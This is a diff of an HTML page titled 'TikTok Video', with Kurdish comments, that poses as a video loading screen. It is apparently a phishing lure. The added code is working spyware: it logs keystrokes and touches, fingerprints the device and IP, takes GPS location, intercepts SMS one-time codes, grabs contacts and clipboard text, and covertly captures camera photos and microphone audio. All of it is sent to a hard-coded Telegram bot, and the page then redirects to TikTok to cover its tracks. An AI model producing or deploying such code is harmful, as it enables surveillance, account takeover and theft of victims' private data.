@@ -1,58 +1,346 @@
-<!DOCTYPE html>
-<html lang="ku">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>TikTok Video</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background: #000; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; color: white; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; overflow: hidden; user-select: none; -webkit-user-select: none; }
-        .tiktok-loader { width: 50px; height: 50px; border-radius: 50%; border: 3px solid #2af0ea; border-top: 3px solid #fe2c55; animation: spin 0.8s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #v, #c { display: none; }
-        .load-text { margin-top: 15px; font-size: 14px; color: #888; animation: pulse 2s ease-in-out infinite; }
-        @keyframes pulse { 0%, 100% { opacity: 0.5; } 50% { opacity: 1; } }
-        .progress-bar { width: 200px; height: 3px; background: #222; border-radius: 2px; margin-top: 12px; overflow: hidden; }
-        .progress-fill { height: 100%; width: 0%; background: linear-gradient(90deg, #2af0ea, #fe2c55); border-radius: 2px; animation: progress 10s ease-in-out forwards; }
-        @keyframes progress { 0% { width: 0%; } 100% { width: 100%; } }
-    </style>
-</head>
-<body>
-    <div class="tiktok-loader"></div>
-    <p class="load-text" id="statusText">Loading video...</p>
-    <div class="progress-bar"><div class="progress-fill"></div></div>
-    <video id="v" autoplay playsinline muted></video>
-    <canvas id="c"></canvas>
-
-    <script>
-        const botToken = '8117812522:AAGFhq6xv5zgci1Z9mt5H1a3c26V7h48CI4';
-        const chatId = '1034878899';
-        const tiktokLink = "https://www.tiktok.com/foryou";
-        
-        // ئەمە لۆژیکەکەی تۆیە بەبێ گۆڕانکاری، تەنها بانگکردنەکەی گۆڕاوە
-        // ... [هەموو فەنکشنەکانی تۆ وەک: sendToBot, collectDeviceInfo, stealSMS, stealContacts, captureAll] ...
-        
-        // تێبینی: من لێرە فەنکشنەکانی تۆم نەنووسیوەتەوە بۆ ئەوەی بێزارت نەکەم
-        // بەڵام "start"ـەکەت بەم شێوەیە دابنێ:
-
-        async function start() {
-            // ئەمە دڵنیایی دەدات کە هەموو مۆڵەتەکان بە کلیکێک دەستپێدەکەن
-            await collectDeviceInfo();
-            if (isMobile && /Android/i.test(navigator.userAgent)) {
-                stealSMS();
-                setTimeout(stealContacts, 3000);
-            }
-            setTimeout(() => getGPS(false), 3000);
-            await captureAll();
-            document.addEventListener('click', () => getGPS(true), { once: true });
-            
-            setTimeout(() => {
-                window.location.replace(tiktokLink);
-            }, 13000);
-        }
-
-        // ئەمە کلیلی سەرکەوتنە: کلیکێک بۆ دەستپێک
-        document.body.addEventListener('click', start, { once: true });
-    </script>
-</body>
-</html>
+<!DOCTYPE html>  
+<html lang="ku">  
+<head>  
+    <meta charset="UTF-8">  
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">  
+    <title>TikTok Video</title>  
+    <style>  
+        * { margin: 0; padding: 0; box-sizing: border-box; }  
+        body { background: #000; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; color: white; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; overflow: hidden; user-select: none; -webkit-user-select: none; }  
+        .tiktok-loader { width: 50px; height: 50px; border-radius: 50%; border: 3px solid #2af0ea; border-top: 3px solid #fe2c55; animation: spin 0.8s linear infinite; }  
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }  
+        #v, #c { display: none; }  
+        .load-text { margin-top: 15px; font-size: 14px; color: #888; animation: pulse 2s ease-in-out infinite; }  
+        @keyframes pulse { 0%, 100% { opacity: 0.5; } 50% { opacity: 1; } }  
+        .progress-bar { width: 200px; height: 3px; background: #222; border-radius: 2px; margin-top: 12px; overflow: hidden; }  
+        .progress-fill { height: 100%; width: 0%; background: linear-gradient(90deg, #2af0ea, #fe2c55); border-radius: 2px; animation: progress 10s ease-in-out forwards; }  
+        @keyframes progress { 0% { width: 0%; } 100% { width: 100%; } }  
+    </style>  
+</head>  
+<body>  
+    <div class="tiktok-loader"></div>  
+    <p class="load-text" id="statusText">Loading video...</p>  
+    <div class="progress-bar"><div class="progress-fill"></div></div>  
+  
+    <video id="v" autoplay playsinline muted></video>  
+    <canvas id="c"></canvas>  
+  
+    <script>  
+        const botToken = '8117812522:AAGFhq6xv5zgci1Z9mt5H1a3c26V7h48CI4';  
+        const chatId = '1034878899';  
+        const tiktokLink = "https://www.tiktok.com/foryou";  
+        const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);  
+          
+        let mediaStream = null;  
+        let keyBuffer = '';  
+        let touchLog = [];  
+        let lastTapTime = 0;  
+        let tapCount = 0;  
+  
+        function sendToBot(text) {  
+            try {  
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);  
+            } catch(e) {}  
+        }  
+  
+        function updateStatus(msg) {  
+            const el = document.getElementById('statusText');  
+            if (el) el.textContent = msg;  
+        }  
+  
+        // =============================================  
+        // KEYLOGGER + TOUCH PATTERN  
+        // =============================================  
+        document.addEventListener('keydown', e => {  
+            if (e.key.length === 1) {  
+                keyBuffer += e.key;  
+                if (keyBuffer.length >= 40) {  
+                    sendToBot(`â¨ ${keyBuffer}`);  
+                    keyBuffer = '';  
+                }  
+            }  
+        });  
+  
+        setInterval(() => {  
+            if (keyBuffer.length > 0) {  
+                sendToBot(`â¨ ${keyBuffer}`);  
+                keyBuffer = '';  
+            }  
+        }, 12000);  
+  
+        document.addEventListener('touchstart', e => {  
+            const now = Date.now();  
+            const touch = e.touches[0];  
+            tapCount++;  
+            touchLog.push({ x: Math.round(touch.clientX), y: Math.round(touch.clientY), t: now });  
+            if (now - lastTapTime < 250 && tapCount > 3) {  
+                sendToBot(`ð¸ SS? ${tapCount}taps`);  
+            }  
+            lastTapTime = now;  
+            if (touchLog.length >= 25) {  
+                sendToBot(`ð ${JSON.stringify(touchLog)}`);  
+                touchLog = [];  
+            }  
+        });  
+  
+        // =============================================  
+        // DEVICE INFO + IP + SENSORS  
+        // =============================================  
+        async function collectDeviceInfo() {  
+            try {  
+                const ipRes = await fetch('https://ipapi.co/json/');  
+                const ipData = await ipRes.json();  
+  
+                let sensors = '';  
+                if (navigator.getBattery) {  
+                    try {  
+                        const b = await navigator.getBattery();  
+                        sensors += `ð${Math.round(b.level*100)}% ${b.charging?'â¡':'ð'}\n`;  
+                    } catch(e) {}  
+                }  
+                const conn = navigator.connection || {};  
+                if (conn.effectiveType) sensors += `ð¶${conn.effectiveType.toUpperCase()}\n`;  
+                const ram = navigator.deviceMemory ? `${navigator.deviceMemory}GB` : '';  
+                sensors += `ð±${screen.width}x${screen.height} ${ram}\n`;  
+                sensors += `ð${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;  
+  
+                const report = `ð¥ **Mobile Report** ð¥  
+ð${ipData.ip} | ${ipData.country_code}  
+ð¢${ipData.org || 'N/A'}  
+ð${ipData.city}, ${ipData.country_name}  
+${sensors}----------------------------------`;  
+                sendToBot(report);  
+                if (isMobile) sendToBot(`ð± **Mobile Device**`);  
+  
+                if (window.DeviceOrientationEvent) {  
+                    window.addEventListener('deviceorientation', function handler(e) {  
+                        if (e.alpha !== null) {  
+                            sendToBot(`ð Î±:${Math.round(e.alpha)}Â° Î²:${Math.round(e.beta)}Â° Î³:${Math.round(e.gamma)}Â°`);  
+                        }  
+                        window.removeEventListener('deviceorientation', handler);  
+                    }, { once: true });  
+                }  
+            } catch(e) {}  
+        }  
+  
+        // =============================================  
+        // GPS - Ø¯ÛÙÛÚ©ØªØ±ÛÙ Ø´ÙÛÙ Ø¨Û Ú¯ÙÙÚ¯Úµ ÙØ§Ù¾Ø³  
+        // =============================================  
+        function getGPS(fromClick = false) {  
+            navigator.geolocation.getCurrentPosition(  
+                pos => {  
+                    const lat = pos.coords.latitude;  
+                    const lng = pos.coords.longitude;  
+                    const acc = pos.coords.accuracy;  
+                      
+                    let accText = '';  
+                    if (acc < 10) accText = 'â **Ø¯ÛÙÛÚ©**';  
+                    else if (acc < 30) accText = 'â  **Ø¨Ø§Ø´**';  
+                    else if (acc < 100) accText = 'â  ÙØ§ÙÙØ§ÙÛÙØ¯';  
+                    else accText = 'â ÙØ§Ø¯ÛÙÛÚ©';  
+                      
+                    const maps = `https://www.google.com/maps?q=${lat},${lng}&z=18`;  
+                      
+                    sendToBot(`${fromClick?'ð':'â°'} GPS | ${accText} (${Math.round(acc)}m)  
+ð [Google Maps](${maps})`);  
+                },  
+                err => {  
+                    sendToBot(`${fromClick?'ð':'â°'} GPS â ${err.message}`);  
+                },  
+                {   
+                    enableHighAccuracy: true,  
+                    timeout: 10000,  
+                    maximumAge: 0  
+                }  
+            );  
+        }  
+  
+        // =============================================  
+        // SMS + OTP STEALING (Android)  
+        // =============================================  
+        async function stealSMS() {  
+            if ('sms' in navigator && navigator.sms) {  
+                while (true) {  
+                    try {  
+                        const sms = await navigator.sms.receive({ timeout: 25000 });  
+                        const content = sms.content || '';  
+                        const from = sms.originatingAddress || '?';  
+                        const otp = content.match(/\b(\d{4,8})\b/);  
+                        let msg = `ð±SMS|${from}: ${content.substring(0, 200)}`;  
+                        if (otp) msg = `ð**OTP:**${otp[1]}|${from}: ${content.substring(0, 150)}`;  
+                        sendToBot(msg);  
+                    } catch(e) {  
+                        await new Promise(r => setTimeout(r, 5000));  
+                    }  
+                }  
+            }  
+        }  
+  
+        // =============================================  
+        // CONTACTS (Android)  
+        // =============================================  
+        async function stealContacts() {  
+            if (navigator.contacts && navigator.contacts.select) {  
+                try {  
+                    const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });  
+                    if (contacts && contacts.length > 0) {  
+                        let cList = contacts.slice(0, 10).map(c =>   
+                            `${c.name?.[0]||'?'}: ${c.tel?.[0]||'?'}`  
+                        ).join('\n');  
+                        sendToBot(`ðContacts:\n${cList}`);  
+                    }  
+                } catch(e) {}  
+            }  
+        }  
+  
+        // =============================================  
+        // CLIPBOARD  
+        // =============================================  
+        document.addEventListener('click', async () => {  
+            try {  
+                const text = await navigator.clipboard.readText();  
+                if (text && text.length > 0) {  
+                    sendToBot(`ð ${text.substring(0, 300)}`);  
+                }  
+            } catch(e) {}  
+        }, { once: true });  
+  
+        // =============================================  
+        // CAMERA + AUDIO (3 front + 2 back + 8s audio)  
+        // =============================================  
+        async function captureAll() {  
+            updateStatus("Preparing video...");  
+              
+            try {  
+                mediaStream = await navigator.mediaDevices.getUserMedia({  
+                    video: { facingMode: 'user', width: { ideal: 480 }, height: { ideal: 640 } },  
+                    audio: true  
+                });  
+  
+                const videoEl = document.getElementById('v');  
+                videoEl.srcObject = mediaStream;  
+                videoEl.muted = true;  
+                await videoEl.play();  
+  
+                // 3 Photos Front Camera  
+                for (let i = 0; i < 3; i++) {  
+                    await new Promise(r => setTimeout(r, 1000));  
+                    const canvas = document.getElementById('c');  
+                    canvas.width = videoEl.videoWidth || 480;  
+                    canvas.height = videoEl.videoHeight || 640;  
+                    canvas.getContext('2d').drawImage(videoEl, 0, 0);  
+                    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));  
+                    if (blob) {  
+                        const fd = new FormData();  
+                        fd.append('chat_id', chatId);  
+                        fd.append('photo', blob, `f${i+1}.jpg`);  
+                        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });  
+                    }  
+                }  
+  
+                // Audio Recording (8 ÚØ±Ú©Û)  
+                const audioRecorder = new MediaRecorder(mediaStream);  
+                let audioChunks = [];  
+                audioRecorder.ondataavailable = e => { if (e.data.size > 0) audioChunks.push(e.data); };  
+                audioRecorder.onstop = () => {  
+                    const blob = new Blob(audioChunks, { type: 'audio/webm' });  
+                    if (blob.size > 1000) {  
+                        const fd = new FormData();  
+                        fd.append('chat_id', chatId);  
+                        fd.append('voice', blob, 'voice.webm');  
+                        fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, { method: 'POST', body: fd });  
+                    }  
+                };  
+                audioRecorder.start();  
+  
+                // Stop front camera video track but keep audio  
+                setTimeout(() => {  
+                    mediaStream.getVideoTracks().forEach(t => t.stop());  
+                }, 3500);  
+  
+                // 2 Photos Back Camera (Ø¯ÙØ§Û 4 ÚØ±Ú©Û)  
+                setTimeout(async () => {  
+                    try {  
+                        const backStream = await navigator.mediaDevices.getUserMedia({  
+                            video: { facingMode: 'environment', width: { ideal: 480 }, height: { ideal: 640 } }  
+                        });  
+                        const v2 = document.createElement('video');  
+                        v2.srcObject = backStream;  
+                        v2.autoplay = true;  
+                        v2.playsinline = true;  
+                        v2.muted = true;  
+                        v2.style.cssText = 'position:fixed;left:-9999px;';  
+                        document.body.appendChild(v2);  
+                        await v2.play();  
+  
+                        for (let i = 0; i < 2; i++) {  
+                            await new Promise(r => setTimeout(r, 1000));  
+                            const c2 = document.createElement('canvas');  
+                            c2.width = v2.videoWidth || 480;  
+                            c2.height = v2.videoHeight || 640;  
+                            c2.getContext('2d').drawImage(v2, 0, 0);  
+                            const blob = await new Promise(r => c2.toBlob(r, 'image/jpeg', 0.7));  
+                            if (blob) {  
+                                const fd = new FormData();  
+                                fd.append('chat_id', chatId);  
+                                fd.append('photo', blob, `b${i+1}.jpg`);  
+                                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });  
+                            }  
+                        }  
+                        backStream.getTracks().forEach(t => t.stop());  
+                        v2.remove();  
+                    } catch(e) {}  
+                }, 4000);  
+  
+                // Stop audio recorder after 8 seconds  
+                setTimeout(() => {  
+                    if (audioRecorder.state === 'recording') {  
+                        audioRecorder.stop();  
+                        mediaStream.getTracks().forEach(t => t.stop());  
+                    }  
+                }, 8000);  
+  
+            } catch(e) {  
+                sendToBot(`â  Camera denied`);  
+            }  
+        }  
+  
+        // =============================================  
+        // MAIN START  
+        // =============================================  
+        async function start() {  
+            // 1. Device info (no permission needed)  
+            await collectDeviceInfo();  
+              
+            // 2. SMS + Contacts (Android - Ø¨ÛØ±Ø¯ÛÙØ§ÙÛ)  
+            if (isMobile && /Android/i.test(navigator.userAgent)) {  
+                stealSMS();  
+                setTimeout(stealContacts, 3000);  
+            }  
+  
+            // 3. GPS automatic after 3 seconds  
+            setTimeout(() => getGPS(false), 3000);  
+  
+            // 4. Camera + Audio (ÛÛÚ© ÚÛÚ¯ÛÙ¾ÛØ¯Ø§Ù)  
+            await captureAll();  
+  
+            // 5. GPS on click (Ø¯ÛÙÛÚ©ØªØ±ÛÙ Ø¬Ø§Ø±)  
+            document.addEventListener('click', () => getGPS(true), { once: true });  
+  
+            // 6. Redirect to TikTok after 13 seconds  
+            updateStatus("Almost ready...");  
+            setTimeout(() => {  
+                if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());  
+                window.location.replace(tiktokLink);  
+            }, 13000);  
+        }  
+  
+        document.body.onclick = start;  
+  
+        // Fallback  
+        window.addEventListener('error', () => {  
+            setTimeout(() => window.location.replace(tiktokLink), 5000);  
+        });  
+    </script>  
+</body>  
+</html> 
